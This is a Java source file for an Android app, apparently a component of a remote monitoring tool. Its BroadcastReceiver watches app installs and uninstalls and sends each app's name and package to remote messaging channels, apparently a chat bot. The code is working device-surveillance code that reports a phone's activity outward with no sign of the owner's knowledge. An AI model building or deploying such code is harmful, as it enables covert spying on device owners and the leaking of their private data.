package com.tenix.karasu;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;

public class PkgReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context ctx, Intent intent) {
        if (krs.instance == null) return;
        if (intent.getData() == null) return;

        String pkg    = intent.getData().getSchemeSpecificPart();
        boolean added = Intent.ACTION_PACKAGE_ADDED.equals(intent.getAction());

        String label = pkg;
        try {
            PackageManager pm = ctx.getPackageManager();
            ApplicationInfo ai = pm.getApplicationInfo(pkg, 0);
            label = pm.getApplicationLabel(ai).toString();
        } catch (Exception ignored) {}

        String msg = added
            ? "📦 *App Installed*\nName: " + label + "\nPkg: " + pkg
            : "🗑️ *App Uninstalled*\nName: " + label + "\nPkg: " + pkg;

        for (String ch : krs.instance.parseChannels()) {
            krs.instance.sendText(msg, ch);
        }
    }
}
